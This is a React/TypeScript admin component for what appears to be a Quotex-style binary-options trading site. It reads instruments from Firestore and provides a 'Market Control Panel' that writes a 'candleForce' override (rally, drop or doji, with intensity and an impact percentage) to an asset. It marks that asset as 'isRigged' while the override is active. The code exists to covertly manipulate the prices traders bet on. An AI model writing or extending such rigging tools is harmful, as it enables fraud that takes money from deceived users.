import React, { useState, useEffect } from 'react';
import { collection, onSnapshot, doc, updateDoc, setDoc } from 'firebase/firestore';
import { db } from '../../firebase';
import { Activity, ArrowUpCircle, ArrowDownCircle, MinusCircle, AlertTriangle } from 'lucide-react';
import { QUOTEX_ASSETS } from '../../../pages/Trading'; // adjust path

export default function AdminInstruments() {
  const [dbInstruments, setDbInstruments] = useState<any>({});
  const [selectedAsset, setSelectedAsset] = useState<any>(null);
  
  // Controls state
  const [controlType, setControlType] = useState<'RALLY' | 'DROP' | 'BASE'>('RALLY');
  const [intensity, setIntensity] = useState<'NORMAL' | 'STRONG' | 'VERY_STRONG'>('NORMAL');
  const [percentage, setPercentage] = useState<number>(50);
  const [categoryFilter, setCategoryFilter] = useState('ALL');
  const [search, setSearch] = useState('');

  useEffect(() => {
    const unsub = onSnapshot(collection(db, 'instruments'), (snap) => {
      const map: any = {};
      snap.docs.forEach(d => {
        map[d.id] = d.data();
      });
      setDbInstruments(map);
    }, (err) => console.warn(err));
    return () => unsub();
  }, []);

  const handleApplyControl = async () => {
    if (!selectedAsset) return;
    try {
      await setDoc(doc(db, 'instruments', selectedAsset.id), {
        ...selectedAsset,
        candleForce: {
          type: controlType,
          intensity,
          percentage,
          triggerTime: Date.now()
        }
      }, { merge: true });
      setSelectedAsset(null);
      alert('Market Control applied to ' + selectedAsset.name);
    } catch (e) {
      console.error(e);
      alert('Error applying control');
    }
  };

  const handleClearControl = async (asset: any) => {
    try {
      await setDoc(doc(db, 'instruments', asset.id), {
        candleForce: null
      }, { merge: true });
    } catch (e) {
      console.error(e);
    }
  };

  const filteredAssets = QUOTEX_ASSETS.filter(a => 
    (categoryFilter === 'ALL' || a.category === categoryFilter) &&
    a.name.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="space-y-6 text-white pb-20">
      <div className="flex justify-between items-center">
        <h2 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-emerald-400">Trading Engine & Instruments</h2>
      </div>

      <div className="bg-[#1a202c] rounded-xl border border-[#2b3342] p-4 flex gap-4">
        <input 
          type="text" 
          placeholder="Search pair..." 
          className="flex-1 bg-[#151a23] border border-[#2b3342] rounded-lg p-3 text-white focus:outline-none focus:border-blue-500"
          value={search}
          onChange={e => setSearch(e.target.value)}
        />
        <select 
          className="bg-[#151a23] border border-[#2b3342] rounded-lg p-3 text-white focus:outline-none"
          value={categoryFilter}
          onChange={e => setCategoryFilter(e.target.value)}
        >
          <option value="ALL">All Categories</option>
          <option value="CURRENCIES">Currencies</option>
          <option value="CRYPTO">Crypto</option>
          <option value="COMMODITIES">Commodities</option>
          <option value="STOCKS">Stocks</option>
        </select>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
        {filteredAssets.map(asset => {
          const dbData = dbInstruments[asset.id] || {};
          const isRigged = dbData.candleForce && (Date.now() - dbData.candleForce.triggerTime < 60000); // active for 1 min
          
          return (
            <div key={asset.id} className={`bg-[#1a202c] rounded-xl border ${isRigged ? 'border-amber-500 shadow-[0_0_15px_rgba(245,158,11,0.2)]' : 'border-[#2b3342]'} p-4 flex flex-col gap-4 relative overflow-hidden transition-all hover:border-[#3d72ff]`}>
              <div className="flex justify-between items-start">
                <div>
                  <div className="text-lg font-black">{asset.name}</div>
                  <div className="text-xs text-[#8390a0] font-bold tracking-wider">{asset.category}</div>
                </div>
                <div className="text-2xl">{asset.flags}</div>
              </div>
              
              <div className="mt-auto pt-4 border-t border-[#2b3342] flex justify-between items-center">
                {isRigged ? (
                  <div className="flex items-center gap-2 text-xs font-bold text-amber-500 bg-amber-500/10 px-2 py-1 rounded">
                    <AlertTriangle size={14} /> 
                    {dbData.candleForce.type} ({dbData.candleForce.intensity})
                  </div>
                ) : (
                  <div className="text-xs font-bold text-emerald-500 bg-emerald-500/10 px-2 py-1 rounded">Market Normal</div>
                )}
                
                <div className="flex gap-2">
                  {isRigged && (
                    <button onClick={() => handleClearControl(asset)} className="px-3 py-1.5 text-xs font-bold bg-red-500/20 text-red-500 rounded hover:bg-red-500/30">Clear</button>
                  )}
                  <button onClick={() => setSelectedAsset(asset)} className="px-3 py-1.5 text-xs font-bold bg-[#3d72ff] hover:bg-[#2b5ae6] text-white rounded">Control</button>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Control Modal */}
      {selectedAsset && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#151a23] border border-[#2b3342] rounded-2xl w-full max-w-lg p-6 shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-purple-500"></div>
            
            <h3 className="text-2xl font-black text-white mb-1">Market Control Panel</h3>
            <p className="text-[#8390a0] text-sm mb-6">Live Engine Override: <span className="text-white font-bold">{selectedAsset.name}</span></p>

            <div className="space-y-6">
              <div>
                <label className="block text-xs font-bold text-[#8390a0] uppercase tracking-wider mb-3">Candle Type</label>
                <div className="grid grid-cols-3 gap-3">
                  <button onClick={() => setControlType('RALLY')} className={`p-3 rounded-xl border flex flex-col items-center gap-2 transition-all ${controlType === 'RALLY' ? 'bg-emerald-500/20 border-emerald-500 text-emerald-500' : 'bg-[#1a202c] border-[#2b3342] text-gray-400 hover:border-emerald-500/50'}`}>
                    <ArrowUpCircle size={24} />
                    <span className="text-xs font-bold">RALLY (Green)</span>
                  </button>
                  <button onClick={() => setControlType('BASE')} className={`p-3 rounded-xl border flex flex-col items-center gap-2 transition-all ${controlType === 'BASE' ? 'bg-blue-500/20 border-blue-500 text-blue-500' : 'bg-[#1a202c] border-[#2b3342] text-gray-400 hover:border-blue-500/50'}`}>
                    <MinusCircle size={24} />
                    <span className="text-xs font-bold">BASE (Doji)</span>
                  </button>
                  <button onClick={() => setControlType('DROP')} className={`p-3 rounded-xl border flex flex-col items-center gap-2 transition-all ${controlType === 'DROP' ? 'bg-red-500/20 border-red-500 text-red-500' : 'bg-[#1a202c] border-[#2b3342] text-gray-400 hover:border-red-500/50'}`}>
                    <ArrowDownCircle size={24} />
                    <span className="text-xs font-bold">DROP (Red)</span>
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-[#8390a0] uppercase tracking-wider mb-3">Intensity (Volume/Size)</label>
                <div className="grid grid-cols-3 gap-3">
                  <button onClick={() => setIntensity('NORMAL')} className={`p-2 rounded-lg border text-sm font-bold transition-all ${intensity === 'NORMAL' ? 'bg-white text-black border-white' : 'bg-[#1a202c] border-[#2b3342] text-gray-400'}`}>Normal</button>
                  <button onClick={() => setIntensity('STRONG')} className={`p-2 rounded-lg border text-sm font-bold transition-all ${intensity === 'STRONG' ? 'bg-white text-black border-white' : 'bg-[#1a202c] border-[#2b3342] text-gray-400'}`}>Strong</button>
                  <button onClick={() => setIntensity('VERY_STRONG')} className={`p-2 rounded-lg border text-sm font-bold transition-all ${intensity === 'VERY_STRONG' ? 'bg-white text-black border-white' : 'bg-[#1a202c] border-[#2b3342] text-gray-400'}`}>Very Strong</button>
                </div>
              </div>

              <div>
                <div className="flex justify-between mb-2">
                  <label className="text-xs font-bold text-[#8390a0] uppercase tracking-wider">Market Impact %</label>
                  <span className="text-xs font-bold text-white">{percentage}%</span>
                </div>
                <input 
                  type="range" 
                  min="1" max="100" 
                  value={percentage} 
                  onChange={(e) => setPercentage(Number(e.target.value))}
                  className="w-full h-2 bg-[#2b3342] rounded-lg appearance-none cursor-pointer accent-blue-500" 
                />
              </div>
            </div>

            <div className="flex justify-end gap-3 mt-8 pt-4 border-t border-[#2b3342]">
              <button onClick={() => setSelectedAsset(null)} className="px-5 py-2.5 rounded-xl font-bold text-[#8390a0] hover:text-white hover:bg-[#2b3342] transition-colors">Cancel</button>
              <button onClick={handleApplyControl} className="px-5 py-2.5 rounded-xl font-bold bg-gradient-to-r from-blue-500 to-purple-500 text-white hover:shadow-[0_0_20px_rgba(59,130,246,0.4)] transition-all">
                Execute Override
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
